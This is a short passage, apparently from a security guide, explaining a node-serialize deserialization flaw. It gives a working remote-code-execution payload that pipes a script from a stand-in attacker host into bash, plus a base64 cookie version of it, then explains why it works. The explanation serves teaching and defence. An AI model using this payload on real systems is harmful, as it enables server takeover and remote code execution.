**Attack Payload**:
```javascript
// Malicious serialized object with IIFE (Immediately Invoked Function Expression)
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('curl https://attacker.com/shell.sh | bash')}()"}

// Base64 encoded payload for cookie:
// eyJyY2UiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24oKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYygnY3VybCBodHRwczovL2F0dGFja2VyLmNvbS9zaGVsbC5zaCB8IGJhc2gnKX0oKSJ9
```

**Why This Is Dangerous**:
- `node-serialize` uses `eval()` internally to reconstruct functions
- The `_$$ND_FUNC$$_` marker tells the library to evaluate the following string as a function
- The trailing `()` causes immediate execution during deserialization
- Attacker gains full server access with Node.js process privileges

